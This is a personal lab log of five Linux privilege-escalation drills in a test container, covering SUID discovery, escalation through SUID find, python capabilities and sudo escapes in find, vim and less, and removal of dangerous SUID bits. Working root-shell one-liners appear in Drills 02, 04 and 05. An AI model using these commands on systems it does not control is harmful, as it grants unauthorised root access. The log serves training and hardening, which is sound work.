# Test Log - Privilege Escalation

Feb 24, 2026

## Drill 01: Finding SUID Binaries

Used Ubuntu 22.04 container.

Ran:
```bash
find / -perm -4000 2>/dev/null
```

Found 8 SUID binaries. All of them legitimate (passwd, su, mount, umount, etc).

Checked one:
```bash
ls -l /usr/bin/passwd
```

Shows `-rwsr-xr-x` - that 's' is the SUID bit.

Result: PASS

---

## Drill 02: Exploiting SUID find

Created regular user 'attacker'. Made find SUID root (simulating bad config).

From attacker's shell:
```bash
find /tmp -exec /bin/bash -p \;
```

Boom. Root shell.

whoami → root  
id → uid=1000(attacker) euid=0(root)

The euid=0 means the system treats me as root even though I'm really attacker.

Result: PASS

---

## Drill 03: Removing Dangerous SUID

Added SUID to find, vim, and less (simulating mistakes).

Removed them:
```bash
chmod u-s /usr/bin/find
chmod u-s /usr/bin/vim  
chmod u-s /usr/bin/less
```

Checked with `find / -perm -4000` again. Only the 8 safe ones left.

Result:  PASS

---

## Drill 04: Capabilities

Gave python the CAP_SETUID capability.

From regular user:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Became root. uid went from 1001 to 0.

Learned that capabilities can be just as dangerous as SUID if the wrong program gets them.

Result: PASS

---

## Drill 05: Sudo Exploits

Admin gave me sudo access to find, vim, and less.

All three got me root:
- find: `sudo find /tmp -exec bash \;`
- vim: `sudo vim -c ':!bash'`
- less: opened a file, pressed `!`, typed `bash`

Every "harmless" command had a way out.

Result: PASS

---

## 5/5 passed

What I learned:
- Programs with -exec or shell escapes = instant root if SUID or sudo
- Capabilities are more precise than SUID but still risky
- Admins think find/vim/less are safe. They're not.
- Check GTFOBins before giving anything sudo access
